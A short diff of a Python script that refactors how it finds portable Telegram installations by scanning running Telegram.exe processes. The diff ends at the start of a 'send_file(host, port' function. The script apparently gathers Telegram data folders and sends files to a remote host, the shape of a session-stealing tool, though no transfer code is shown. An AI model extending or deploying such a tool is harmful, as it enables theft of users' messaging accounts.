@@ -92,7 +92,7 @@ def init():
     """
 
     if PORTABLE_DETECTION:
-        find_portable()
+        installation_locations.extend(find_portable())
 
     for loc in installation_locations:
         if loc.is_dir():
@@ -122,6 +122,7 @@ def find_portable():
     Finds all currently running Telegram.exe,
     then add its parent directory to 'installation_locations'
     """
+    portable_installations = []
     all_telegram_processes = pgrep('Telegram.exe')
 
     for process in all_telegram_processes:
@@ -130,7 +131,9 @@ def find_portable():
 
         # don't add the directory if it's already searched by default
         if exe_parent not in installation_locations:
-            installation_locations.append(exe_parent)
+            portable_installations.append(exe_parent)
+
+    return portable_installations
 
 
 def send_file(host, port,
